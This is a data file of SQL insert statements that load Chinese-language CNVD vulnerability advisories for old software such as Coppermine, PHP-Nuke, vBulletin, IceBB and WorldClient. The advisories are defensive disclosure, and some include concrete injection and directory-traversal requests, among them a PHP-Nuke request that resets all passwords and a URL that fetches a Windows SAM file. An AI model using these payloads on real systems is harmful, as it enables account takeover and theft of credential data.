"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Coppermine Photo Gallery多个SQL注入和本地文件包含漏洞', 'CNVD-2009-2824', '2009-05-18', '高', '(暂无)', '', '', 'Coppermine是用PHP编写的多用途集成Web图形库脚本。       在Coppermine的/includes/init.inc.php文件的42-65行，远程攻击者可以绕过防register_global保护，执行SQL盲注或本地文件包含攻击：      $keysToSkip = array(\'_POST\', \'_GET\', \'_COOKIE\', \'_REQUEST\', \'_SERVER\', \'HTML_SUBST\', \'keysToSkip\', \'register_globals_flag\', \'cpgdebugger\');      if (ini_get(\'register_globals\') == \'1\' || strtolower(ini_get(\'register_globals\')) == \'on\') {   $register_globals_flag = true;   } else {   $register_globals_flag = false;   }      if (get_magic_quotes_gpc()) {   if (is_array($_POST)) {   foreach ($_POST as $key =&gt; $value) {   if (!is_array($value))   $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);   if (!in_array($key, $keysToSkip) &amp;&amp; isset($$key) &amp;&amp; $register_globals_flag) unset($$key);   }   }      if (is_array($_GET)) {   foreach ($_GET as $key =&gt; $value) {   unset($_GET[$key]);   $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);   if (!in_array($key, $keysToSkip) &amp;&amp; isset($$key) &amp;&amp; $register_globals_flag) unset($$key);   }   }      $_COOKIE和$_SERVER变量存在同样问题。在magic_quotes_gpc = off时，可绕过保护通过GET或POST请求定义GLOBALS。      以下是exploit攻击的方式。在./thumbnails.php文件的79行：      if (isset($_GET[\'sort\'])) $USER[\'sort\'] = $_GET[\'sort\'];   if (isset($_GET[\'cat\'])) $cat = (int)$_GET[\'cat\']; &amp;lt;== bypass the int cast    if (isset($_GET[\'album\'])) $album = $_GET[\'album\'];      ...   if (is_numeric($album)) {   ...      } else {   $album_set_array = array();   if ($cat == USER_GAL_CAT)   $where = \'category &gt; \' . FIRST_USER_CAT;   else   $where = &quot;category = \'$cat\'&quot;;      $result = cpg_db_query(&quot;SELECT aid FROM {$CONFIG[\'TABLE_ALBUMS\']} WHERE $where&quot;); &amp;lt;== Vulnerable query      -----------------------------------------------------------------------------------------      还可以通过本地文件包含覆盖$USER数组，具体来说是$USER[\'lang\']变量。在/include/functions.inc.php文件的128-135行：      function user_get_profile()   {   global $CONFIG, $USER;      if (isset($_COOKIE[$CONFIG[\'cookie_name\'].\'_data\'])) {   $USER = @unserialize(@base64_decode($_COOKIE[$CONFIG[\'cookie_name\'].\'_data\']));   $USER[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&amp;lt;&gt;|`\', \'____________\'); &amp;lt;== we bypass it   }      if (!isset($USER[\'ID\']) || strlen($USER[\'ID\']) != 32) {   list($usec, $sec) = explode(\' \', microtime());   $seed = (float) $sec + ((float) $usec \* 100000);   srand($seed);   $USER=array(\'ID\' =&gt; md5(uniqid(rand(),1)));   } else {   $USER[\'ID\'] = addslashes($USER[\'ID\']);   }      if (!isset($USER[\'am\'])) $USER[\'am\'] = 1;   }      /includes/init.inc.php文件的318-346行：      if (isset($USER[\'lang\']) &amp;&amp; !strstr($USER[\'lang\'], \'/\') &amp;&amp; file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))   {   $CONFIG[\'default_lang\'] = $CONFIG[\'lang\']; // Save default language   $CONFIG[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&amp;lt;&gt;|`\', \'____________\');   }   elseif ($CONFIG[\'charset\'] == \'utf-8\') &amp;lt;== default configuration   {   include(\'include/select_lang.inc.php\');   if (file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))   {   $CONFIG[\'default_lang\'] = $CONFIG[\'lang\']; // Save default language   $CONFIG[\'lang\'] = $USER[\'lang\'];   }   }   else   {   unset($USER[\'lang\']);   }      if (isset($CONFIG[\'default_lang\']) &amp;&amp; ($CONFIG[\'default_lang\']==$CONFIG[\'lang\']))   {   unset($CONFIG[\'default_lang\']);   }      if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;))   $CONFIG[\'lang\'] = \'english\';      // We load the chosen language file   require &quot;lang/{$CONFIG[\'lang\']}.php&quot;; &amp;lt;== vulnerable include      -----------------------------------------------------------------------------------------      如果启用了注册功能，能够通过口令创建或修改相册的用户可以执行sql盲注。      ./db_input.php文件：       $event = isset($_POST[\'event\']) ? $_POST[\'event\'] : $_GET[\'event\'];   switch ($event) {      ...      case \'album_update\':   if (!(USER_ADMIN_MODE || GALLERY_ADMIN_MODE)) cpg_die(ERROR, $lang_errors[\'perm_denied\'], __FILE__, __LINE__); &amp;lt;== USER_ADMIN_MODE is TRUE if we are logged in      $aid = (int)$_POST[\'aid\'];   $title = addslashes(trim($_POST[\'title\']));   $category = (int)$_POST[\'category\'];   $description = addslashes(trim($_POST[\'description\']));   $keyword = addslashes(trim($_POST[\'keyword\']));   $thumb = (int)$_POST[\'thumb\'];   $visibility = (int)$_POST[\'visibility\'];   $uploads = $_POST[\'uploads\'] == \'YES\' ? \'YES\' : \'NO\';   $comments = $_POST[\'comments\'] == \'YES\' ? \'YES\' : \'NO\';   $votes = $_POST[\'votes\'] == \'YES\' ? \'YES\' : \'NO\';   $password = $_POST[\'alb_password\']; &amp;lt;== this var is not addslashed   $password_hint = addslashes(trim($_POST[\'alb_password_hint\']));   $visibility = !empty($password) ? FIRST_USER_CAT + USER_ID : $visibility;      if (!$title) cpg_die(ERROR, $lang_db_input_php[\'alb_need_title\'], __FILE__, __LINE__);      if (GALLERY_ADMIN_MODE) {   $query = &quot;UPDATE {$CONFIG[\'TABLE_ALBUMS\']} SET title=\'$title\', description=\'$description\', category=\'$category\', thumb=\'$thumb\', uploads=\'$uploads\', comments=\'$comments\', votes=\'$votes\', visibility=\'$visibility\', alb_password=\'$password\', alb_password_hint=\'$password_hint\', keyword=\'$keyword\' WHERE aid=\'$aid\' LIMIT 1&quot;;   } else {   $category = FIRST_USER_CAT + USER_ID;   $query = &quot;UPDATE {$CONFIG[\'TABLE_ALBUMS\']} SET title=\'$title\', description=\'$description\', thumb=\'$thumb\', comments=\'$comments\', votes=\'$votes\', visibility=\'$visibility\', alb_password=\'$password\', &amp;lt;== vulnerable query alb_password_hint=\'$password_hint\',keyword=\'$keyword\' WHERE aid=\'$aid\' AND category=\'$category\' LIMIT 1&quot;;   }      $update = cpg_db_query($query);      在查询中使用之前没有对$_POST[\'alb_password\']执行addslash操作。init.inc.php中过滤了所有_GET、_POST和_REQUEST变量：       // Do some cleanup in GET, POST and cookie data and un-register global vars   $HTML_SUBST = array(\'&amp;\' =&gt; \'&amp;amp;\', \'&quot;\' =&gt; \'&amp;quot;\', \'&amp;lt;\' =&gt; \'&amp;lt;\', \'&gt;\' =&gt; \'&amp;gt;\', \'%26\' =&gt; \'&amp;amp;\', \'%22\' =&gt; \'&amp;quot;\', \'%3C\' =&gt; \'&amp;lt;\', \'%3E\' =&gt; \'&amp;gt;\',\'%27\' =&gt; \'&amp;#39;\', &quot;\'&quot; =&gt; \'&amp;#39;\');       ...   $_POST[$key] = strtr(stripslashes($value), $HTML_SUBST);   ...   $_GET[strtr(stripslashes($key), $HTML_SUBST)] = strtr(stripslashes($value), $HTML_SUBST);   ...   $_REQUEST[$key] = strtr(stripslashes($value), $HTML_SUBST);      但没有处理反斜线（\），因此可以操作查询在$_POST[\'alb_password\']的默认注入反斜线并在$_POST[\'alb_password_hint\']参数中执行SQL。       ------------------------------------------------------------------------------------------      某些配置的Coppermine中还存在一些SQL盲注。在./displayecard.php文件的26-38行：      if (!isset($_GET[\'data\'])) cpg_die(CRITICAL_ERROR, $lang_errors[\'param_missing\'], __FILE__, __LINE__);      $data = array();   $data = @unserialize(@base64_decode($_GET[\'data\']));      // attempt to obtain full link from db if ecard logging enabled and min 12 chars of data is provided and only 1 match   if ((!is_array($data)) &amp;&amp; $CONFIG[\'log_ecards\'] &amp;&amp; (strlen($_GET[\'data\']) &gt; 12)) {   $result = cpg_db_query(&quot;SELECT link FROM {$CONFIG[\'TABLE_ECARDS\']} WHERE link LIKE \'{$_GET[\'data\']}%\'&quot;);   if (mysql_num_rows($result) === 1) {   $row = mysql_fetch_assoc($result);   $data = @unserialize(@base64_decode($row[\'link\']));   }   }', '', 'Coppermine  ----------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.chezgreg.net/coppermine/', '(无补丁信息)', '已验证', '2009-05-18', '2009-05-18', '2009-05-19', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Timbuktu Pro文件上传及日志注入漏洞', 'CNVD-2008-1255', '2008-03-10', '中', '(暂无)', '', 'CVE-2008-1117,CVE-2008-1118', 'Motorola的Timbuktu Pro是一款远程控制软件，允许远程访问计算机桌面。      Timbuktu的tb2pro.exe所加载的tb2ftp.dll库在实现Notes功能期间检查目标文件名时没有正确地过滤&ldquo;\&rdquo;和&ldquo;/&rdquo;字符，允许攻击者执行目录遍历攻击，向目标机器的任意位置上传文件；Timbuktu直接从用户所发送的报文中获取了一些包含有对等端信息的字段（计算机名、用户名、IP地址等），并在目标机器的屏幕上显示这些信息，这就允许攻击者在受害用户的日志行中伪造对等端信息。      以下是反汇编的漏洞代码：      /-----------      .text:6063A62E mov edx, [ebp+lp]   .text:6063A631 mov eax, [edx+20h] ; Packet field containing filename   .text:6063A634 push eax ; EAX is also the output buffer   .text:6063A635 call ds:Pascal2C ; Extract filename from packet      .text:6063A63B push \'\\' ; Char to filter in the filename   .text:6063A63D mov ecx, [ebp+lp]   .text:6063A640 mov edx, [ecx+20h]   .text:6063A643 push edx ; Filename obtained in 0x6063A635   .text:6063A644 call _strrchr ; Search for \'\\' in the filename   .text:6063A649 add esp, 8 ; At this point, the pointer to the   ; position of the \'\\' is obtained and   ; will be stored in a local variable.      .text:6063A64C mov [ebp+pSlashPosition], eax ; Store \'\\' pointer   .text:6063A64F cmp [ebp+pSlashPosition], 0 ; This is the BUG !!!!   .text:6063A653 jnz short loc_6063A669 ; It avoids checking \'/\' if   ; \'\\' was found, so we must   ; send \'\\' and then as much   ; &quot;../&quot; as we want :)      .text:6063A655 push \'/\' ; This check won\'t be done   .text:6063A657 mov eax, [ebp+lp] ; because the \'\\' was found   .text:6063A65A mov ecx, [eax+20h]   .text:6063A65D push ecx   .text:6063A65E call _strrchr   .text:6063A663 add esp, 8   .text:6063A666 mov [ebp+pSlashPosition], eax      .text:6063A669 loc_6063A669:   .text:6063A669 cmp [ebp+pSlashPosition], 0 ; Check if a slash was    ;found so   .text:6063A66D jz short loc_6063A68C ; it   copies past it\'s ;position   .text:6063A66F push 200h   .text:6063A674 mov edx, [ebp+pSlashPosition]; Get the \'\\' position   and move   .text:6063A677 add edx, 1 ; forward 1 byte to avoid it   .text:6063A67A push edx   .text:6063A67B mov eax, [ebp+lp]   .text:6063A67E add eax, 4B0h   .text:6063A683 push eax   .text:6063A684 call ds:lstrcpynA ; From know on, the filename   .text:6063A68A jmp short loc_6063A6A ; contains something like   ; ../a.exe :)   . . . . .      - -----------/', '', 'Motorola  --------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.motorola.com/', '(无补丁信息)', '已验证', '2008-03-10', '2008-03-10', '2008-03-10', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PHP-Nuke SQL插入修改任意用户信息漏洞', 'CNVD-2002-3966', '2002-10-31', '高', '(暂无)', '', 'CVE-2002-1242', 'PHP-Nuke是一个网站创建和管理工具，它可以使用很多数据库软件作为后端，比如MySQL、PostgreSQL、mSQL、Interbase、Sybase等。      PHP-Nuke对&quot;bio&quot;字段缺少正确的过滤，远程攻击者可以利用这个漏洞通过SQL注入攻击修改用户信息，包括密码。      攻击者可以通过在&quot;bio&quot;字段插入\'\\'，可以绕过引用，导致可以进行SQL注入，下面的操作可以修改任何PHP-NUKE用户密码为&quot;1&quot;。      要利用这个漏洞，用户必须登录PHP-NUKE系统，进入帐户管理，通过查看源代码判断用户UID后，提交如下请求：      modules.php?name=Your_Account&amp;op=saveuser&amp;uid=2&amp;bio=%5c&amp;EditedMessage=no&amp;pass=xxxxx&amp;vpass=xxxxx&amp;newsletter=,+bio=0,+pass=md5(1)/\*       可以更改SQL命令逻辑为：      UPDATE nuke_users    SET name = \'\',    email = \'\',    femail = \'\',    url = \'http://\',    pass = \'xxxxx\',    +--[ bio = \'\\',    | user_avatar = \'\',    | user_icq = \'\',    | user_occ = \'\',    | user_from = \'\',    | user_intrest = \'\',    | user_sig = \'\',    | user_aim = \'\',    | user_yim = \'\',    | user_msnm = \'\',    +--[ newsletter = \',    bio=0,pass=md5(1)/\*\' WHERE uid=\'2\'       上面标识区域作为值存储到bio中，而&quot;where&quot;子句被注释，可以使更新的命令更新整个用户表密码信息。', '', 'Francisco Burzi  ---------------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      Francisco Burzi Upgrade PHP-Nuke 6.0   http://www.phpnuke.org./modules.php?name=Downloads&amp;d_op=getit&amp;lid=321', '(无补丁信息)', '已验证', '2002-10-31', '2002-10-31', '2002-10-31', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Blazix特殊字符处理源代码泄露漏洞', 'CNVD-2002-3462', '2002-08-24', '中', '(暂无)', '', 'CVE-2002-1451', 'Blazix是一款免费开放源代码的由JAVA编写的WEB服务程序，可使用在Linux和Microsoft Windows操作系统下。      Blazix没有很正确的处理包含特殊字符的请求，远程攻击者可以利用这个漏洞获得.jsp脚本的源代码。      Blazix的API在打开文件时对文件名中包含的特殊字符\'+\'和\'\\'(不是%2b和%5c)没有进行正确的解析，攻击者可以在请求的.jsp脚本文件名后追加\'+\'或者\'\\'字符，可导致获得脚本的源代码信息，其中可能包含部分密码等敏感信息。', '', 'Desiderata Software  -------------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.blazix.com/', '(无补丁信息)', '已验证', '2002-08-24', '2002-08-24', '2002-08-28', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2006-7437', 'CNVD-2006-7437', '2006-09-26', '中', '(暂无)', '', '', '危害远程攻击者可以利用漏洞进行sql注入攻击，获得敏感信息。攻击所需条件攻击者必须访问VBulletin。漏洞信息VBulletin是一款基于PHP的流行的论坛程序。VBulletin不正确过滤用户提交的URI数据，远程攻击者可以利用漏洞进行sql注入攻击，获得敏感信息。问题是由于\'Global.PHP\'脚本对用户提交的\'templatesused\'参数缺少过滤，提交恶意sql查询作为参数数据，可更改原来的sql逻辑，获得敏感信息。测试方法http://www.example.com/global.php?templatesused=nn,dd,\'))/\* SELECT template,title FROM template WHERE (title IN (\'nn\',\'dd\',\'\\\\'))/\*\',\'gobutton\',\'timezone\',\'username_loggedout\',\'username_loggedin\',\'phpinclude\',\'headinclude\',\'header\',\'footer\',\'forumjumpbit\',\'forumjump\',\'nav_linkoff\',\'nav_linkon\',\'navbar\',\'nav_joiner\',\'pagenav\',\'pagenav_curpage\',\'pagenav_firstlink\',\'pagenav_lastlink\',\'pagenav_nextlink\',\'pagenav_pagelink\',\'pagenav_prevlink\') AND (templatesetid=-1 OR templatesetid=1)) ORDER BY templatesetid厂商解决方案目前没有解决方案提供：http://www.vBulletin.com/', 'http://www.securityfocus.com/archive/1/archive/1/447010/100/0/threaded  http://www.securityfocus.com/bid/20214  http://securityreason.com/securityalert/1661  http://xforce.iss.net/xforce/xfdb/29174', '', '(无补丁信息)', '(暂无验证信息)', '2006-09-26', '2006-09-26', '2006-09-26', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('SolarWinds TFTP服务程序目录遍历漏洞', 'CNVD-2002-3913', '2002-10-24', '低', '(暂无)', '', 'CVE-2002-1209', 'SolarWinds TFTP服务程序可以同时发送和接收多个文件，经常用于下载/上传路由器，交换机等可执行映象和配置文件。       SolarWinds TFTP服务程序对用户提交的请求缺少过滤，远程攻击者可以利用这个漏洞以TFTP进程权限查看系统上任意文件内容。      SolarWinds TFTP服务程序对\'..\字符缺少正确处理，攻击者可以提交多个包含\'..\\'字符的的GET请求，可以遍历系统目录，以TFTP进程权限查看系统任意文件内容。', '', 'SolarWinds  ----------  SolarWinds TFTP Server v5.0.60和之后的版本不存在此漏洞，请到厂商的主页下载：      http://www.solarwinds.net/Tools/Free_tools/TFTP_Server/', '(无补丁信息)', '已验证', '2002-10-24', '2002-10-24', '2002-10-29', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Epic Games Unreal Tournament Engine UMOD manifest.ini远程任意文件覆盖漏洞', 'CNVD-2004-1210', '2004-04-22', '高', '(暂无)', '', 'CVE-2004-1958', 'EpicGames开发的Unreal引擎支持UMOD文件格式可方便安装游戏扩展程序。      Epic Games Unreal缺少正确的输入验证，远程攻击者可以利用这个漏洞指定任意系统文件作为覆盖对象，而导致本地文件破坏。      由于对manifest.ini进行处理时，没有对目录格式为\'..\\'的字符进行正确处理，可导致绕过目录限制覆盖系统中任意文件。', '', 'Epic Games  ----------  Unreal Tournament 2004不存在此漏洞，建议用户采用新版本：      http://www.unrealtournament.com/', '(无补丁信息)', '已验证', '2004-04-22', '2004-04-22', '2004-04-22', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('BRS WebWeaver MKDIR目录遍历漏洞', 'CNVD-2003-0115', '2003-01-10', '高', '(暂无)', '', '', 'BRS WebWeaver是一款集成小型快速的HTTP和FTP服务程序，提供目录保护功能，适用于Windows 9x/NT操作系统。      BRS WebWeaver的FTP服务程序不正确处理用户提交的输入参数，远程攻击者可以利用这个漏洞通过目录遍历攻击，以FTP权限在系统上建立任意目录。      由于FTP服务程序对用户提交的输入缺少过滤，攻击者提交包含多个\'..\\'字符的目录名作为mkdir参数，可以绕过FTP ROOT目录在系统上建立任意目录。', '', 'BRS  ---  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.bsoutham.org/WebWeaver/', '(无补丁信息)', '已验证', '2003-01-10', '2003-01-10', '2003-01-15', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PunBB profile.php脚本用户配置文件编辑模块SQL注入漏洞', 'CNVD-2005-2384', '2005-07-11', '高', '(暂无)', '', '', 'PunBB是一款基于PHP的论坛程序。      PunBB的profile.php用户配置文件模块中存在SQL注入漏洞，远程攻击者可能非授权访问数据库。      // Singlequotes around non-empty values and NULL for ...   while (list($key, $input) = @each($form))    {   $value = ($input !== \'\') ?    \'\\'\'.$db-&gt;escape($input).\'\\'\' : NULL;   $temp[] = $key.\'=\'.$value;   }      $db-&gt;query(\'UPDATE \'.$db-&gt;prefix.\'users SET \'.   implode(\',\', $temp)...      这段代码没有验证$temp变量，因此如果打开了register_globals的话，攻击者可以就通过GET、POST或COOKIE变量提供任意key=value字符串。成功利用这个漏洞的攻击者可以获得对论坛的管理访问。', '', 'PunBB  -----  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载1.2.6版本：      http://www.punbb.org/download/punbb-1.2.6.tar.gz', '(无补丁信息)', '已验证', '2005-07-11', '2005-07-11', '2005-07-11', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('IceBB username参数SQL注入漏洞', 'CNVD-2008-3662', '2008-07-26', '高', '(暂无)', '', '', 'IceBB是一个基于PHP+MySQL的开源论坛系统。      IceBB的modules/members.php文件没有正确地验证对username参数的输入便用在了SQL查询中：         $fleh = $icebb-&gt;input; &amp;lt;==   ...   foreach($fleh as $k =&gt; $g)   {    ...   $where_clauses[] = &quot;{$k}=\'{$g}\'&quot;; &amp;lt;==   ...   }   ...      $this-&gt;qwhere = implode(\' AND \',$where_clauses);   $total = $db-&gt;fetch_result(&quot;SELECT COUNT(\*) as total FROM icebb_users{$this-&gt;qwhere}{$qextra}&quot;); &amp;lt;==      这个查询中可以包含有更多的GET/POST输入，如$username和$url。如果设置username=\的话，则之后的句法会成为字符串的一部分，而下一个引号开始（$url之前）会成为SQL。例如，         # GET /index.php?act=members&amp;username=a\&amp;url=OR+1#      会变为      # &quot;SELECT COUNT(\*) as total FROM icebb_users WHERE user_group=\'a\\' AND username=\'OR 1#\' AND id!=0 ORDER BY username ASC&quot;      因此远程攻击者可以通过$username参数执行SQL注入攻击。', '', 'XAOS Interactive  ----------------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      http://icebb.net/', '(无补丁信息)', '(暂无验证信息)', '2008-07-26', '2008-07-26', '2008-07-29', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('WorldClient 2.1 HTTP文件泄漏漏洞', 'CNVD-2000-0751', '2000-07-17', '低', '(暂无)', '', '', 'web server WDaemon (World Client Daemon)是web邮件系统World Client 2.1的一部分,用来提供HTTP接口，由于没有正确处理连结请求中包含的&quot;..\&quot;，攻击者可能远程下载任意已知路径和名字的文件。例如，当提交类似下列的URL请求时：http://email.example.com/..\..\..\winnt\repair\sam._将会下载sam._文件。注意：一些版本的浏览器会自动将\'\\' 替换成 \'/\'，因此可能不能进行正确验证&amp;lt;\* 来源：Rikard Carlsson (rikard.carlsson@INFOSEC.SE) \*&gt;', '', '', '(无补丁信息)', '已验证', '2000-07-17', '2000-07-17', '2000-07-17', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Speechd 特权命令执行漏洞', 'CNVD-2001-2443', '2001-09-11', '低', '(暂无)', '', '', 'BUGTRAQ  ID: 3326CVE(CAN) ID: &amp;lt;a href=&quot;http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CAN-2001-0956&quot; target=&quot;_blank&quot;&gt;CAN-2001-0956&amp;lt;/a&gt;Speechd是在Linux下的针对语音合成的一个设备独立层，为很多基于语音的应用或者设备驱动提供接口。它存在一个安全问题，可能允许本地用户通过传输恶意命令给/dev/speech设备来以root权限执行这些命令。问题出在speechd中的下列代码中：system(&quot;$cmd \\'$text\\'&quot;); &amp;lt;\*来源：Tyler Spivey (&amp;lt;a href=\'mailto:tspivey8@home.com\'&gt;tspivey8@home.com&amp;lt;/a&gt;)  链接：&amp;lt;a href=\'http://archives.neohapsis.com/archives/bugtraq/2001-09/0089.html\'&gt;http://archives.neohapsis.com/archives/bugtraq/2001-09/0089.html&amp;lt;/a&gt; \*&gt;', '', '', '(无补丁信息)', '(暂无验证信息)', '2001-09-11', '2001-09-11', '2001-09-14', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('PHP str_getcsv()中断信息泄漏漏洞', 'CNVD-2010-1012', '2010-06-28', '低', '(暂无)', '', 'CVE-2010-2100', 'PHP是一款流行的网络编程语言。PHP包含的str_getcsv()函数中存在信息泄露漏洞：PHP_FUNCTION(str_getcsv){    char \*str, delim = \',\', enc = \'&quot;\', esc = \'\\';    char \*delim_str = NULL, \*enc_str = NULL, \*esc_str = NULL;    int str_len = 0, delim_len = 0, enc_len = 0, esc_len = 0;    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;s|sss&quot;, &amp;str, &amp;str_len, &amp;delim_str, &amp;delim_len,         &amp;enc_str, &amp;enc_len, &amp;esc_str, &amp;esc_len) == FAILURE) {        return;    }        delim = delim_len ? delim_str[0] : delim;    enc = enc_len ? enc_str[0] : enc;    esc = esc_len ? esc_str[0] : esc;    php_fgetcsv(NULL, delim, enc, esc, str_len, str, return_value TSRMLS_CC);}在这种情况下，zend_parse_parameters()把四个参数到局部变量，破坏了变量与源ZVAL间的联系。问题是字符串指针会指向源字符串ZVALs完全相同的字符串，但当原字符串ZVALs通过中断攻击修改，会导致字符串指针非法，指向已释放并重用的内存。由于zend_parse_parameters()支持对象的__toString()方法使得这种情况下中断攻击很容易。攻击者只需传递对象给str_getcsv()函数的第二，三或第四个参数。由于PHP的调用时通过引用传递功能，攻击者可通过__toString()方法结束第一个参数，当重用HASH表时，可造成php_fgetcsv()工作在HASH表内存之上而非通常字符串的内存，导致内部敏感内存偏移信息泄漏。', '', '', '(无补丁信息)', '(暂无验证信息)', '2010-06-28', '2010-06-28', '2010-06-28', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('DCAM WebCam Server Personal Web Server远程目录遍历漏洞', 'CNVD-2003-3686', '2003-12-22', '高', '(暂无)', '', '', 'DCAM WebCam Server是一款开放源代码基于WEB的在线视频流和广播服务程序。      DCAM WebCam Server不充分过滤用户提交的URI请求，远程攻击者可以利用这个漏洞以WEB权限查看系统上任意文件内容。      问题是由于服务程序对\'.\\'字符没有正确过滤，攻击者可以提交包含多个\'.\\'字符的URI请求，绕过WEB ROOT限制，以WEB进程权限查看系统上任意文件内容。', '', 'DCAM WebCam server  ------------------  目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：      DCAM WebCam Server APAR DCAMServer-8.2.6.i386.exe   http://prdownloads.sourceforge.net/dcamserver/DCAMServer-8.2.6.i386.exe?download', '(无补丁信息)', '已验证', '2003-12-22', '2003-12-22', '2003-12-29', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('discuz! 7.x faq.php SQL注入漏洞', 'CNVD-2014-04028', '2014-07-04', '高   (AV:N/AC:L/Au:N/C:C/I:N/A:N)', 'Discuz! Discuz! 7.x', '', '', 'Discuz!是一款国内流行的社区论坛平台。     Discuz 7.2版本faq.php存在SQL注入漏洞，漏洞产生的原因：discuz在全局对GET数组进行addslashes转义，将\'转义成\\'，即当传入的参数是：gids[1]=\'时，会被转义成$gids[1]=\\'，而此时的赋值语句$groupids[] = $row[0]等同于取到字符串的第一个字符&ldquo;\&rdquo;，即获取到转义符号。允许攻击者利用漏洞获取数据库敏感信息。', 'http://www.unhonker.com/bug/1630.html  http://www.cnnetsec.com/2030.html', '目前厂商已经发布了补丁升级程序，请广大用户及时下载：  http://www.discuz.net/forum.php?mod=viewthread&amp;tid=3579915', 'discuz! 7.x faq.php SQL注入漏洞的补丁', '已验证', '2014-07-04', '2014-07-04', '2014-07-09', '(无附件)')"
------------------------
